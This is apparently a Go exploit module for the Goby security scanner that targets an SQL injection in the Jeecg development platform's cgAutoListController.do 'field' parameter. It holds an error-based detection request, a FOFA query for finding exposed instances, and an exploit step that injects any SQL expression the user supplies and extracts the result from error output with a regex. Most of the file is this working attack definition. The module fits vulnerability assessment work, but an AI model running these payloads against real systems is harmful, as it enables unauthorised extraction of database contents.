package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Jeecg micro cloud rapid development platform field SQL injection vulnerability",
    "Description": "<p>Jeecg (J2EE code generation) is an intelligent development platform based on code generator. Leading the new development mode (online coding - &gt; code generator - &gt; manual merge intelligent development) can help solve 90% of the repetitive work of Java projects and make development pay more attention to business logic. It can not only quickly improve the development efficiency, help the company save labor costs, but also do not malfunction the activity.</p><p>Jeecg has a SQL injection vulnerability, which can be used by attackers to obtain sensitive database information.</p>",
    "Product": "Jeecg micro cloud rapid development platform",
    "Homepage": "https://gitee.com/jeecg/jeecg",
    "DisclosureDate": "2022-03-31",
    "Author": "xiaodan",
    "FofaQuery": "body=\"loginController.do?\"",
    "GobyQuery": "body=\"loginController.do?\"",
    "Level": "3",
    "Impact": "<p>Jeecg has a SQL injection vulnerability, which can be exploited by an attacker to obtain sensitive database information.</p>",
    "Recommendation": "<p>Currently, there is no official security patch. Please follow the manufacturer's update. https://gitee.com/jeecg/jeecg<a href=\"https://www.chanjet.com/\"></a></p><p><a href=\"https://fanyi.baidu.com/translate###\"></a><a></a></p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "input",
            "value": "user()",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/api/../cgAutoListController.do?datagrid&configId=jform_contact&field=extractvalue(1,concat(char(126),md5(0624)))",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Accept-Encoding": "gzip, deflate",
                    "X-Requested-With": "XMLHttpRequest"
                },
                "data_type": "text",
                "data": "page=1&rows=10&sort=create_date&order=desc"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "48ab2f9b45957ab574cf005eb8a7676",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/api/../cgAutoListController.do?datagrid&configId=jform_contact&field=extractvalue(1,concat(char(126),{{{sql}}}))",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Accept-Encoding": "gzip, deflate",
                    "X-Requested-With": "XMLHttpRequest"
                },
                "data_type": "text",
                "data": "page=1&rows=10&sort=create_date&order=desc"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|error\\: '~(.*?)'"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "5",
    "Translation": {
        "CN": {
            "Name": "JEECG 微云快速开发平台 field sql注入漏洞",
            "Product": "JEECG 微云快速开发平台",
            "Description": "<p style=\"margin-left: 0em;\">JEECG（J2EE Code Generation）是一款基于代码生成器的智能开发平台。引领新的开发模式(Online Coding-&gt;代码生成器-&gt;手工MERGE智能开发)，可以帮助解决Java项目90%的重复工作，让开发更多关注业务逻辑。既能快速提高开发效率，帮助公司节省人力成本，同时又不失灵活性。</p><p style=\"margin-left: 0em;\"><span style=\"color: rgba(255, 255, 255, 0.87); font-size: 16px;\">JEECG</span><span style=\"color: rgb(62, 62, 62); font-size: 14px;\">存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。</span><br></p>",
            "Recommendation": "<p>目前官方未发布安全补丁，请关注厂商更新。<a href=\"https://gitee.com/jeecg/jeecg\" rel=\"nofollow\">https://gitee.com/jeecg/jeecg</a><br></p>",
            "Impact": "<p style=\"margin-left: 0em;\">JEECG<span style=\"color: rgb(62, 62, 62); font-size: 14px;\">存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。</span><br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Jeecg micro cloud rapid development platform field SQL injection vulnerability",
            "Product": "Jeecg micro cloud rapid development platform",
            "Description": "<p>Jeecg (J2EE code generation) is an intelligent development platform based on code generator. Leading the new development mode (online coding - &gt; code generator - &gt; manual merge intelligent development) can help solve 90% of the repetitive work of Java projects and make development pay more attention to business logic. It can not only quickly improve the development efficiency, help the company save labor costs, but also do not malfunction the activity.</p><p>Jeecg has a SQL injection vulnerability, which can be used by attackers to obtain sensitive database information.</p>",
            "Recommendation": "<p><span style=\"color: rgba(255, 255, 255, 0.87); font-size: 16px;\">Currently, there is no official security patch. Please follow the manufacturer's update. <a href=\"https://gitee.com/jeecg/jeecg\" rel=\"nofollow\">https://gitee.com/jeecg/jeecg</a></span><a href=\"https://www.chanjet.com/\" target=\"_blank\"></a></p><p><a href=\"https://fanyi.baidu.com/translate###\"></a><a></a></p>",
            "Impact": "<p>Jeecg has a SQL injection vulnerability, which can be exploited by an attacker to obtain sensitive database information.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10697"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}